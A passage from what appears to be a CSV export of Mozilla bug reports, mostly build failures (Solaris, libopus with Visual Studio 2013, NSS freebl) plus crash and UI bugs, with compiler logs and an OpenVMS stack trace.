-DMOZ_PROFILELOCKING=1 -DMOZ_DLL_SUFFIX=\"".so\"" -DXP_UNIX=1 -DUNIX_ASYNC_DNS=1 -DJS_THREADSAFE=1 -DNS_PRINT_PREVIEW=1 -DNS_PRINTING=1 -DMOZ_ACCESSIBILITY_ATK=1 -DMOZILLA_LOCALE_VERSION=\""1.9a1\"" -DMOZILLA_REGION_VERSION=\""1.9a1\"" -DMOZILLA_SKIN_VERSION=\""1.8\""  -D_MOZILLA_CONFIG_H_ -DMOZILLA_CLIENT nsGREGlue.cpp ""nsGREGlue.cpp"", line 448: Error: A class with a reference member must have a user-defined constructor. ""nsGREGlue.cpp"", line 495: Error: Expected an expression. ""nsGREGlue.cpp"", line 501: Error: Use "";"" to terminate statements. 3 Error(s) detected. gmake[4]: *** [nsGREGlue.o] Error 3 gmake[4]: *** Waiting for unfinished jobs....   sunray-x86 $ /share/lang/i386/10/SUNWspro/bin/CC -V       CC: Sun C++ 5.7 Patch 117831-02 2005/03/30   Reproducible: Always  Steps to Reproduce: 1. Try a build on x86 solaris 2. 3.  Actual Results:   Build failure",nsGREGlue.cpp fails to compile on Solaris x86
10877,"/nss       -MD            -FI ../../dist/include/mozilla-config.h -DMOZILLA_CLIE NT  -TC -nologo -W3 -Gy -Fdgenerated.pdb -FS -wd4244 -wd4819 -we4553  -DNDEBUG - DTRIMMED -Zi -UDEBUG -DNDEBUG -O1 -Oy  h:/m/mozilla-central/media/libopus/silk/f loat/schur_FLP.c' failed, return code 1 21:05.90 sort_FLP.c 21:05.90 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'inline' : マクロが再定義されました。 21:05.91 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(65) : warning C4005: 'inline' : マクロが再定義されました。 21:05.91         コマンド ラインの引数 : 'inline' の前の定義を確認してください 21:05.91 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'restrict' : マクロが再定義されました。 21:05.92 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(69) : warning C4005: 'restrict' : マクロが再定義されました。 21:05.92         コマンド ラインの引数 : 'restrict' の前の定義を確認してください  21:05.92 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(87) : fatal error C1189: #error :  The C Standard Library forbids macroizing  keywords. Enable warning C4005 to find the forbidden macro. 21:05.92 2 21:05.93 h:\m\mozilla-central\config\rules.mk:1109:0: command 'h:/m/mozilla-cent ral/obj-i686-pc-mingw32/_virtualenv/Scripts/python.exe -O h:/m/mozilla-central/b uild/cl.py cl -Fosort_FLP.obj -c  -DOPUS_BUILD -DOPUS_VERSION='""v1.1-beta-23-gf2 446c2-mozilla""' -DUSE_ALLOCA -Drestrict=  -Dinline=__inline -DNO_NSPR_10_SUPPORT  -Ih:/m/mozilla-central/media/libopus/include -Ih:/m/mozilla-central/media/libop us/celt -Ih:/m/mozilla-central/media/libopus/silk -Ih:/m/mozilla-central/media/l ibopus/src  -Ih:/m/mozilla-central/media/libopus/silk/float -Ih:/m/mozilla-centr al/media/libopus -I. -I../../dist/include  -Ih:/m/mozilla-central/obj-i686-pc-mi ngw32/dist/include/nspr -Ih:/m/mozilla-central/obj-i686-pc-mingw32/dist/include/ nss       -MD            -FI ../../dist/include/mozilla-config.h -DMOZILLA_CLIEN T  -TC -nologo -W3 -Gy -Fdgenerated.pdb -FS -wd4244 -wd4819 -we4553  -DNDEBUG -D TRIMMED -Zi -UDEBUG -DNDEBUG -O1 -Oy  h:/m/mozilla-central/media/libopus/silk/fl oat/sort_FLP.c' failed, return code 1 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.94 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.95 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.96 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.97 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.98 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:05.99 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.00 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.01 <opus.lib.desc>: Found error 21:06.02 <opus.lib.desc>: Found error 21:06.02 <opus.lib.desc>: Found error 21:06.02 <opus.lib.desc>: Found error 21:06.02 <opus.lib.desc>: Found erroranalysis.c 21:06.02 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'inline' : マクロが再定義されました。 21:06.02 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(65) : warning C4005: 'inline' : マクロが再定義されました。 21:06.02         コマンド ラインの引数 : 'inline' の前の定義を確認してください 21:06.03 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'restrict' : マクロが再定義されました。 21:06.03 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(69) : warning C4005: 'restrict' : マクロが再定義されました。 21:06.03         コマンド ラインの引数 : 'restrict' の前の定義を確認してください  21:06.03 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(87) : fatal error C1189: #error :  The C Standard Library forbids macroizing  keywords. Enable warning C4005 to find the forbidden macro. 21:06.04 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.04 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.05 <opus.lib.desc>: Found error 21:06.06 <opus.lib.desc>: Found error 21:06.06 <opus.lib.desc>: Found error 21:06.06 <opus.lib.desc>: Found error 21:06.06 <opus.lib.desc>: Found error 21:06.07 <opus.lib.desc>: Found error 21:06.08 <opus.lib.desc>: Found error2 21:06.09 21:06.10 <opus.lib.desc>: Found error 21:06.10 <opus.lib.desc>: Found error 21:06.10 <opus.lib.desc>: Found error 21:06.10 <opus.lib.desc>: Found error 21:06.10 <opus.lib.desc>: Found error 21:06.10 <opus.lib.desc>: Found error 21:06.11 <opus.lib.desc>: Found error 21:06.11 <opus.lib.desc>: Found error 21:06.11 <opus.lib.desc>: Found error 21:06.11 <opus.lib.desc>: Found error 21:06.11 <opus.lib.desc>: Found error 21:06.12 <opus.lib.desc>: Found error 21:06.13 <opus.lib.desc>: Found error 21:06.13 <opus.lib.desc>: Found error 21:06.15 <opus.lib.desc>: Found error 21:06.15 <opus.lib.desc>: Found error 21:06.15 h:\m\mozilla-central\config\rules.mk:1109:0: command 'h:/m/mozilla-cent ral/obj-i686-pc-mingw32/_virtualenv/Scripts/python.exe -O h:/m/mozilla-central/b uild/cl.py cl -Foanalysis.obj -c  -DOPUS_BUILD -DOPUS_VERSION='""v1.1-beta-23-gf2 446c2-mozilla""' -DUSE_ALLOCA -Drestrict=  -Dinline=__inline -DNO_NSPR_10_SUPPORT  -Ih:/m/mozilla-central/media/libopus/include -Ih:/m/mozilla-central/media/libop us/celt -Ih:/m/mozilla-central/media/libopus/silk -Ih:/m/mozilla-central/media/l ibopus/src  -Ih:/m/mozilla-central/media/libopus/silk/float -Ih:/m/mozilla-centr al/media/libopus -I. -I../../dist/include  -Ih:/m/mozilla-central/obj-i686-pc-mi ngw32/dist/include/nspr -Ih:/m/mozilla-central/obj-i686-pc-mingw32/dist/include/ nss       -MD            -FI ../../dist/include/mozilla-config.h -DMOZILLA_CLIEN T  -TC -nologo -W3 -Gy -Fdgenerated.pdb -FS -wd4244 -wd4819 -we4553  -DNDEBUG -D TRIMMED -Zi -UDEBUG -DNDEBUG -O1 -Oy  h:/m/mozilla-central/media/libopus/src/ana lysis.c' failed, return code 1 21:06.16 <opus.lib.desc>: Found error 21:06.23 mlp.c 21:06.23 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'inline' : マクロが再定義されました。 21:06.23 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(65) : warning C4005: 'inline' : マクロが再定義されました。 21:06.24         コマンド ラインの引数 : 'inline' の前の定義を確認してください 21:06.24 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'restrict' : マクロが再定義されました。 21:06.25 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(69) : warning C4005: 'restrict' : マクロが再定義されました。 21:06.25         コマンド ラインの引数 : 'restrict' の前の定義を確認してください  21:06.25 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(87) : fatal error C1189: #error :  The C Standard Library forbids macroizing  keywords. Enable warning C4005 to find the forbidden macro. 21:06.25 2 21:06.25 h:\m\mozilla-central\config\rules.mk:1109:0: command 'h:/m/mozilla-cent ral/obj-i686-pc-mingw32/_virtualenv/Scripts/python.exe -O h:/m/mozilla-central/b uild/cl.py cl -Fomlp.obj -c  -DOPUS_BUILD -DOPUS_VERSION='""v1.1-beta-23-gf2446c2 -mozilla""' -DUSE_ALLOCA -Drestrict=  -Dinline=__inline -DNO_NSPR_10_SUPPORT -Ih: /m/mozilla-central/media/libopus/include -Ih:/m/mozilla-central/media/libopus/ce lt -Ih:/m/mozilla-central/media/libopus/silk -Ih:/m/mozilla-central/media/libopu s/src  -Ih:/m/mozilla-central/media/libopus/silk/float -Ih:/m/mozilla-central/me dia/libopus -I. -I../../dist/include  -Ih:/m/mozilla-central/obj-i686-pc-mingw32 /dist/include/nspr -Ih:/m/mozilla-central/obj-i686-pc-mingw32/dist/include/nss      -MD            -FI ../../dist/include/mozilla-config.h -DMOZILLA_CLIENT  -T C -nologo -W3 -Gy -Fdgenerated.pdb -FS -wd4244 -wd4819 -we4553  -DNDEBUG -DTRIMM ED -Zi -UDEBUG -DNDEBUG -O1 -Oy  h:/m/mozilla-central/media/libopus/src/mlp.c' f ailed, return code 1 21:06.25 <opus.lib.desc>: Found error 21:06.30 mlp_data.c 21:06.30 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'inline' : マクロが再定義されました。 21:06.30 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(65) : warning C4005: 'inline' : マクロが再定義されました。 21:06.30         コマンド ラインの引数 : 'inline' の前の定義を確認してください 21:06.31 Warning: C4005 in C:\Program Files (x86)\Microsoft Visual Studio 12.0\V C\INCLUDE\xkeycheck.h: 'restrict' : マクロが再定義されました。 21:06.31 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(69) : warning C4005: 'restrict' : マクロが再定義されました。 21:06.31         コマンド ラインの引数 : 'restrict' の前の定義を確認してください  21:06.31 C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\INCLUDE\xkeychec k.h(87) : fatal error C1189: #error :  The C Standard Library forbids macroizing  keywords. Enable warning C4005 to find the forbidden macro. 21:06.31 2 21:06.31 h:\m\mozilla-central\config\rules.mk:1109:0: command 'h:/m/mozilla-cent ral/obj-i686-pc-mingw32/_virtualenv/Scripts/python.exe -O h:/m/mozilla-central/b uild/cl.py cl -Fomlp_data.obj -c  -DOPUS_BUILD -DOPUS_VERSION='""v1.1-beta-23-gf2 446c2-mozilla""' -DUSE_ALLOCA -Drestrict=  -Dinline=__inline -DNO_NSPR_10_SUPPORT  -Ih:/m/mozilla-central/media/libopus/include -Ih:/m/mozilla-central/media/libop us/celt -Ih:/m/mozilla-central/media/libopus/silk -Ih:/m/mozilla-central/media/l ibopus/src  -Ih:/m/mozilla-central/media/libopus/silk/float -Ih:/m/mozilla-centr al/media/libopus -I. -I../../dist/include  -Ih:/m/mozilla-central/obj-i686-pc-mi ngw32/dist/include/nspr -Ih:/m/mozilla-central/obj-i686-pc-mingw32/dist/include/ nss       -MD            -FI ../../dist/include/mozilla-config.h -DMOZILLA_CLIEN T  -TC -nologo -W3 -Gy -Fdgenerated.pdb -FS -wd4244 -wd4819 -we4553  -DNDEBUG -D TRIMMED -Zi -UDEBUG -DNDEBUG -O1 -Oy  h:/m/mozilla-central/media/libopus/src/mlp _data.c' failed, return code 1 21:06.32 <opus.lib.desc>: Found error 21:06.32 <libs>: Found error 21:06.32 evaluation from h:\m\mozilla-central\config\recurse.mk:186:53:7:0: comm and 'c:/mozilla-build/python/python.exe h:/m/mozilla-central/build/pymake/pymake /../make.py -C ../../media/libopus libs' failed, return code 2 21:06.32 evaluation from h:\m\mozilla-central\config\recurse.mk:186:53:12:0: com mand 'c:/mozilla-build/python/python.exe h:/m/mozilla-central/build/pymake/pymak e/../make.py ../../db/sqlite3/src_libs ../../media/libjpeg_libs ../../modules/li bbz2_libs ../../media/libvorbis_libs ../../media/libopus_libs ../../media/libnes tegg_libs ../../media/libvpx_libs ../../media/libogg_libs ../../media/libtheora_ libs ../../media/libspeex_resampler_libs ../../media/libsoundtouch_libs ../../me dia/libcubeb_libs ../../media/libpng_libs ../../media/kiss_fft_libs' failed, ret urn code 2 21:06.32 h:\m\mozilla-central\config\recurse.mk:159:0: command 'c:/mozilla-build /python/python.exe h:/m/mozilla-central/build/pymake/pymake/../make.py -C config /external libs' failed, return code 2 21:06.33 h:\m\mozilla-central\config\rules.mk:697:0: command 'c:/mozilla-build/p ython/python.exe h:/m/mozilla-central/build/pymake/pymake/../make.py libs' faile d, return code 2 21:06.33 h:\m\mozilla-central\client.mk:394:0: command 'c:/mozilla-build/python/ python.exe h:/m/mozilla-central/build/pymake/pymake/../make.py -j4 -C obj-i686-p c-mingw32' failed, return code 2 21:06.33 h:\m\mozilla-central\client.mk:179:0: command 'c:/mozilla-build/python/ python.exe h:/m/mozilla-central/build/pymake/pymake/../make.py -f h:/m/mozilla-c entral/client.mk realbuild' failed, return code 2 21:06.36 From ./dist/sdk: Kept 0 existing; Added/updated 0; Removed 0 files and 1 directories. 21:06.36 From ./dist/public: Kept 0 existing; Added/updated 0; Removed 0 files a nd 1 directories. 21:06.36 From ./dist/private: Kept 0 existing; Added/updated 0; Removed 0 files and 1 directories. 21:06.37 From ../../dist/idl: Kept 1165 existing; Added/updated 0; Removed 0 fil es and 0 directories. 21:06.37 From ./dist/idl: Kept 0 existing; Added/updated 1165; Removed 0 files a nd 0 directories. 21:06.37 From ./dist/bin: Kept 0 existing; Added/updated 0; Removed 0 files and 1 directories. 21:06.37 From _tests: Kept 11 existing; Added/updated 11428; Removed 0 files and  0 directories. 21:06.37 From ./dist/include: Kept 1617 existing; Added/updated 1966; Removed 0 files and 0 directories. 21:06.51 421 compiler warnings present. 2",libopus fails to build using Visual Studio 2013 RTM and 2012
10887,"I'm pretty sure this started with this mornings build.  1. Linux x86_64 with Daily 2014-08-06 build. 2. Initially occurred with a previous Lightning 3.6a1 build, but I also reproduced with the current build from http://ftp.mozilla.org/pub/mozilla.org/calendar/lightning/nightly/latest-comm-central/lightning-3.6a1.en-US.linux-x86_64.xpi 3. Calendar doesn't work.  Timestamp: 08/06/2014 10:33:57 AM Error: NS_ERROR_FILE_NOT_FOUND: Component returned failure code: 0x80520012 (NS_ERROR_FILE_NOT_FOUND) [nsIXPCComponents_Utils.import] Source File: file://.../extensions/%7Be2fda1a4-762b-4020-b5ad-a41df1933103%7D/components/calSleepMonitor.js Line: 5  Timestamp: 08/06/2014 10:33:57 AM Error: NS_ERROR_FILE_NOT_FOUND: Component returned failure code: 0x80520012 (NS_ERROR_FILE_NOT_FOUND) [nsIXPCComponents_Utils.import] Source File: file://.../extensions/%7Be2fda1a4-762b-4020-b5ad-a41df1933103%7D/components/calItemModule.js Line: 5  Timestamp: 08/06/2014 10:33:58 AM Error: NS_ERROR_FILE_NOT_FOUND: Component returned failure code: 0x80520012 (NS_ERROR_FILE_NOT_FOUND) [nsIXPCComponents_Utils.import] Source File: file://.../extensions/%7Be2fda1a4-762b-4020-b5ad-a41df1933103%7D/components/calCompositeCalendar.js Line: 6  Timestamp: 08/06/2014 10:33:58 AM Error: NS_ERROR_FILE_NOT_FOUND: Component returned failure code: 0x80520012 (NS_ERROR_FILE_NOT_FOUND) [nsIXPCComponents_Utils.import] Source File: file://.../extensions/%7Be2fda1a4-762b-4020-b5ad-a41df1933103%7D/components/calTimezoneService.js Line: 7",Lightning 3.6 broken with 2014-08-06 update
10947,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4  I download the latest source code from CVS server, and try to build the Firefox. This is my .mozconfig file when built Firefox:  . $topsrcdir/browser/config/mozconfig  export BUILD_OFFICIAL=1 export MOZILLA_OFFICIAL=1 mk_add_options MOZ_CO_PROJECT=browser mk_add_options BUILD_OFFICIAL=1 mk_add_options MOZILLA_OFFICIAL=1  ac_add_options --enable-shared ac_add_options --disable-static  ac_add_options --disable-activex ac_add_options --disable-activex-scripting  ac_add_options --disable-mailnews ac_add_options --disable-calendar ac_add_options --disable-xinerama ac_add_options --disable-ctl ac_add_options --disable-mathml ac_add_options --disable-ldap-experimental  ac_add_options --disable-tests ac_add_options --disable-gtktest  ac_add_options --enable-debug ac_add_options --enable-strip ac_add_options --enable-strip-libs  ac_add_options --disable-toolkit-gtk ac_add_options --disable-toolkit-xlib ac_add_options --disable-toolkit-qt ac_add_options --disable-accessibility ac_add_options --disable-installer  ac_add_options --disable-optimize   Reproducible: Always  Steps to Reproduce: 1. Start cygwin and change current directory to the Firefox source code root. 2. type make -f client.mk build 3. build some source source always be passed, but failed on building security\nss\lib\freebl  Actual Results:   The following is the segment of the output:  lib -NOLOGO -OUT:""d:/firefox/mozilla/mozilla/nss/freebl/freebl.lib"" d:\\firefox\ \mozilla\\mozilla\\nss\\freebl\\loader.obj echo d:/firefox/mozilla/mozilla/nss/freebl/freebl.lib d:/firefox/mozilla/mozilla/nss/freebl/freebl.lib nsinstall -m 664 d:/firefox/mozilla/mozilla/nss/freebl/freebl.lib d:/firefox/moz illa/mozilla/dist/lib mkdir d:/firefox/mozilla/mozilla/nss/freebl/WIN95_SINGLE_SHLIB cp /cygdrive/d/firefox/mozilla/mozilla/security/nss/lib/freebl/Makefile d:/firef ox/mozilla/mozilla/nss/freebl/WIN95_SINGLE_SHLIB cp /cygdrive/d/firefox/mozilla/mozilla/security/nss/lib/freebl/manifest.mn d:/fi refox/mozilla/mozilla/nss/freebl/WIN95_SINGLE_SHLIB cp /cygdrive/d/firefox/mozilla/mozilla/security/nss/lib/freebl/config.mk d:/fire fox/mozilla/mozilla/nss/freebl/WIN95_SINGLE_SHLIB cd d:/firefox/mozilla/mozilla/nss/freebl/WIN95_SINGLE_SHLIB && /usr/bin/make -j1  FREEBL_CHILD_BUILD=1 \  FREEBL_PARENT=../.. CORE_DEPTH=../../../../.. libs make[6]: Entering directory `/cygdrive/d/firefox/mozilla/mozilla/nss/freebl/WIN9 5_SINGLE_SHLIB' Makefile:51: ../../../../../coreconf/config.mk: No such file or directory Makefile:365: ../../../../../coreconf/rules.mk: No such file or directory   Expected Results:   Can build Firefox with shared libraries.  When I try to modify the nss\lib\manifest.mn to remove the freebl module. It is successful util run shlibsign to sign softokn3.dll with error ""IO error occurred"".",Build error: coreconf/config.mk: No such file or directory
11125,User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20020926 Build Identifier: ftp://ftp.mozilla.org/pub/mozilla/nightly/latest/mozilla-i686-pc-linux-gnu-sea.tar.gz  Download installer.  Extract.  This may be into a separate directory or into mozilla-installer under mozilla.  Execute mozilla-installer.  Exits immediately with no output on stdout or stderr.  Exit code is 164.  Reproducible: Always  Steps to Reproduce: 1.Download 2.Extract 3.cd mozilla-installer 4../mozilla-installer  Actual Results:   Immediate exit. Error code 164  Expected Results:   Installation dialogue.,Installer exits immediately without comment; return code 164
11134,This regressed on all platforms for Firefox and Thunderbird Trunk builds between 0414 and 0416  -Install and use a popular theme -Open the Options(Preferences) window  Linux and Windows the Options Window is vaguely visible. Mac is missing Main menu Icons but has visibility.  I orignally repoted this in bug 290988 as a crasher.  That crash has been fixed by bug 290102. But the transparency issue still exists.,Transparent Options window with non-default theme in use
11201,"From Bugzilla Helper: User-Agent: Mozilla/4.78 [en] (Windows NT 5.0; U) BuildID:    20010802  After installing Mozilla v0.9.3 on OpenVMS v7.2-1, it worked.  I then installed  and configured several other products, DWMOTIF V1.2-6, CSWS_JAVA V1.0 and CSWS  V1.1.  Now Mozilla produces an access violation when trying to start.  Reproducible: Always Steps to Reproduce: 1.@SYS$COMMON:[MOZILLA]MOZILLA from the SYSTEM account 2. 3.  Actual Results:   $ mozilla Starting mozilla-bin... %SYSTEM-F-ACCVIO, access violation, reason mask=00, virtual address=000000000000 0010, PC=00000000025CE634, PS=0000001B %TRACE-F-TRACEBACK, symbolic stack dump follows   image    module    routine             line      rel PC           abs PC  LIBPIPNSS  CERTDB  CERT_LockDB         35789 00000000000033A4 00000000025CE634  LIBPIPNSS  PCERTDB  NewTempCertificate                                         35959 0000000000006B08 00000000025D9558  LIBPIPNSS  PK11CERT  pk11_fastCert     59296 0000000000000B8C 000000000258B92C  LIBPIPNSS  PK11CERT  PK11_MakeCertFromHandle                                         59443 0000000000000F50 000000000258BCF0  LIBPIPNSS  PK11CERT  pk11_DoCerts      59689 000000000000169C 000000000258C43C  LIBPIPNSS  PK11CERT  PK11_TraverseSlot                                         59777 000000000000188C 000000000258C62C  LIBPIPNSS  PK11CERT  pk11_UpdateSlotPQG                                         59913 0000000000001B80 000000000258C920  LIBPIPNSS  PK11CERT  pk11_ExtractCertsFromSlot                                         59916 0000000000000000 0000000000000000  LIBPIPNSS  PK11CERT  PK11_ReadSlotCerts                                         59947 0000000000001CD8 000000000258CA78  LIBPIPNSS  PK11SLOT  PK11_InitToken    62424 000000000000351C 00000000025A035C  LIBPIPNSS  PK11SLOT  PK11_InitSlot     62541 00000000000037A4 00000000025A05E4  LIBPIPNSS  PK11LOAD  SECMOD_LoadModule                                         47283 00000000000004FC 000000000259283C  LIBPIPNSS  PK11UTIL  SECMOD_AddModule  46450 0000000000000AFC 00000000025A5C1C  LIBPIPNSS  PK11UTIL  SECMOD_AddNewModule                                         46552 0000000000000E78 00000000025A5F98  LIBPIPNSS  NSNSSCOMPONENT  InstallLoadableRoots                                         46552 0000000000000E78 00000000025A5F98  LIBPIPNSS  NSNSSCOMPONENT  InstallLoadableRoots                                         75234 000000000000337C 00000000024FE2FC  LIBPIPNSS  NSNSSCOMPONENT  Init        75521 0000000000004784 00000000024FF704  LIBPIPNSS  NSNSSMODULE  nsNSSComponentConstructor                                         55488 00000000000000F4 000000000250A474  LIBXPCOM  NSCOMPONENTMANAGER  CreateInstance                                         49633 0000000000005A50 00000000002DA280  LIBXPCOM  NSREPOSITORY  CreateInstance                                         11171 00000000000002DC 00000000002EAD7C  LIBXPCOM  NSSERVICEMANAGER  GetService                                         26374 0000000000001D64 00000000002ED3B4  LIBXPCOM  NSSERVICEMANAGER  GetService                                         26521 0000000000002518 00000000002EDB68  LIBXPCOM  NSSERVICEMANAGER  GetService                                         26634 0000000000002A7C 00000000002EE0CC  LIBXPCOM  NSSERVICEMANAGER  operator()                                         26094 0000000000000F4C 00000000002EC59C  LIBXPCOM  NSCOMPTR  assign_from_helper                                         10096 0000000000000240 00000000003014B0  LIBJSDOM  NSGLOBALWINDOW  nsCOMPtr      9319 00000000000046C0 00000000023F92A0  LIBJSDOM  NSGLOBALWINDOW  GlobalWindowImpl                                        108862 00000000000073B8 00000000023FBF98  LIBJSDOM  NSGLOBALWINDOW  NS_NewScriptGlobalObject                                        112551 000000000001BD70 0000000002410950  LIBDOCSHELL  NSDOCSHELL  EnsureScriptEnvironment                                         97270 0000000000027728 0000000002300548  LIBDOCSHELL  NSWEBSHELL  GetInterface  95581 00000000000060F4 000000000230B394  LIBXPCOM  NSIINTERFACEREQUESTOR  operator()                                         10190 0000000000000254 0000000000307184  LIBXPCOM  NSCOMPTR  assign_from_helper                                         10096 0000000000000240 00000000003014B0  LIBNSAPPSHELL  NSAPPSHELLSERVICE  nsCOMPtr                                         10391 00000000000015E0 0000000000DFDBE0  LIBNSAPPSHELL  NSAPPSHELLSERVICE  GetHiddenWindowAndJSContext                                         73364 0000000000005304 0000000000E01904  LIBNSAPPSHELL  NSAPPSHELLSERVICE  SetXPConnectSafeContext                                         72808 00000000000034C8 0000000000DFFAC8  LIBNSAPPSHELL  NSAPPSHELLSERVICE  CreateHiddenWindow                                         72881 0000000000003924 0000000000DFFF24  MOZILLA-BIN  NSAPPRUNNER  main1        87502 0000000000009DC0 0000000000039DC0  MOZILLA-BIN  NSAPPRUNNER  main         87838 000000000000AC88 000000000003AC88  MOZILLA-BIN  NSAPPRUNNER  __MAIN           0 0000000000000070 0000000000030070  PTHREAD$RTL                                0 00000000000312FC 000000007BBEB2FC  PTHREAD$RTL                                0 0000000000012B48 000000007BBCCB48                                             0 FFFFFFFF84F393F4 FFFFFFFF84F393F4 $   Expected Results:  I should have had a DECwindows screen with Mozilla appear on  the terminal.  This is an AlphaStation 255 with 512MB memory.  After inital, Mozilla started  just fine. Additional details available upon request.","%SYSTEM-F-ACCVIO, access violation, reason mask=00, virtual address=000000000000"
11238,"User-Agent:       Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.4) Gecko/20030624 Build Identifier: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.4) Gecko/20030624  opening a compose mail message window (no matter how: reply, new message...) ends with error: An error occurred while creating a message compose window. Please try again.   Reproducible: Always  Steps to Reproduce: Ctrl+M e.g.",compose message window won't open
